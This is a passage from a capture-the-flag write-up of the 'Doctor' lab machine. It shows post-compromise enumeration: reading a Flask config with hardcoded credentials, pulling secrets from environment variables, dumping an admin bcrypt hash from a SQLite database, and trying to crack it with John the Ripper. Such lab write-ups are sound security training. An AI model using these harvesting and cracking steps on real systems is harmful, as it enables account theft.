# Creds to doctors.htb Web portal

Enumerating the home dir for user **web** where the Flask application is running I came across this

```shell
web@doctor ~/blog/flaskblog $ cat config.py
import os


class Config:
    SECRET_KEY = os.environ.get('SECRET_KEY')
    WTF_CSRF_CHECK_DEFAULT = False
    SQLALCHEMY_DATABASE_URI = os.environ.get('SQLALCHEMY_DATABASE_URI')
    MAIL_SERVER = ''
    MAIL_PORT = 587
    MAIL_USE_TLS = True
    MAIL_USERNAME = "doctor"
    MAIL_PASSWORD = "doctor"
```

The script gets some of values from shell environment variables which we can extract.

```shell
web@doctor ~/blog/flaskblog $ echo $SECRET_KEY
1234
web@doctor ~/blog/flaskblog $ echo $SQLALCHEMY_DATABASE_URI
sqlite://///home/web/blog/flaskblog/site.db
```

Now we have the path to the DB, we can either copy it back to Kali to read it or try to use Python SQLAlchemy to do so. Here's how to do the latter. I followed this [Youtube video](https://www.youtube.com/watch?v=i35OSGXt7wk). This enumerates the tables

```shell
web@doctor ~/blog/flaskblog $ python3
Python 3.8.2 (default, Jul 16 2020, 14:00:26)
[GCC 9.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from sqlalchemy import create_engine
>>> engine = create_engine("sqlite://///home/web/blog/flaskblog/site.db")
>>> connection = engine.connect()
>>> print(engine.table_names())
['post', 'user']
>>> from sqlalchemy import MetaData, Table
>>> metadata = MetaData()
>>> user = Table("user", metadata, autoload=True, autoload_with=engine)
>>> print(repr(user))
Table('user', MetaData(bind=None), Column('id', INTEGER(), table=<user>, primary_key=True, nullable=False), Column('username', VARCHAR(length=20), table=<user>, nullable=False), Column('email', VARCHAR(length=120), table=<user>, nullable=False), Column('image_file', VARCHAR(length=20), table=<user>, nullable=False), Column('password', VARCHAR(length=60), table=<user>, nullable=False), schema=None)
```

This tells us there are two tables named "post" and "user". I found [another guide](https://www.kite.com/python/answers/how-to-execute-raw-sql-queries-in-sqlalchemy-in-python) which taught how to execute SQL queries in Python SQLAlchemy and hence enumerated both tables.

```shell
>>> from sqlalchemy import text
>>> sql = text("SELECT * FROM post;")
>>> result = connection.execute(sql)
>>> result_as_list = result.fetchall()
>>> for row in result_as_list:
...     print(row)
...
(1, 'Doctor blog', '2020-09-18 20:48:37.55555', 'A free blog to share medical knowledge. Be kind!', 1)
>>> sql = text("SELECT * FROM user;")
>>> result = connection.execute(sql)
>>> result_as_list = result.fetchall()
>>> type(result_as_list)
<class 'list'>
>>> len(result_as_list)
1
>>> print(result_as_list)
[(1, 'admin', 'admin@doctor.htb', 'default.gif', '$2b$12$Tg2b8u/elwAyfQOvqvxJgOTcsbnkFANIDdv6jVXmxiWsg4IznjI0S')]
```

Unfortunately I couldn't bruteforce the bash even in 3 hours with rockyou.txt, suggesting that isn't the way forward.

```shell
root@Kali:~/HTB/Doctor# john --wordlist=/usr/share/wordlists/rockyou.txt admin.hashes
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 4096 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:45:37 0.38% (ETA: 2020-12-06 02:06) 0g/s 23.71p/s 23.71c/s 23.71C/s 18811881..14101410
0g 0:01:08:12 0.62% (ETA: 2020-12-05 07:42) 0g/s 25.90p/s 25.90c/s 25.90C/s keith5..kalen
0g 0:01:48:12 1.05% (ETA: 2020-12-04 18:54) 0g/s 27.61p/s 27.61c/s 27.61C/s swimmy..swanson1
0g 0:02:11:28 1.31% (ETA: 2020-12-04 15:07) 0g/s 28.10p/s 28.10c/s 28.10C/s eskimos..erick17
0g 0:02:17:22 1.37% (ETA: 2020-12-04 14:32) 0g/s 28.19p/s 28.19c/s 28.19C/s trixx..tribble
0g 0:02:36:43 1.59% (ETA: 2020-12-04 12:02) 0g/s 28.52p/s 28.52c/s 28.52C/s lashawne..laparka
0g 0:03:11:16 1.98% (ETA: 2020-12-04 09:13) 0g/s 28.92p/s 28.92c/s 28.92C/s tasha86..taralou
0g 0:03:11:19 1.98% (ETA: 2020-12-04 09:14) 0g/s 28.92p/s 28.92c/s 28.92C/s taniar..tammyw
Session aborted
```

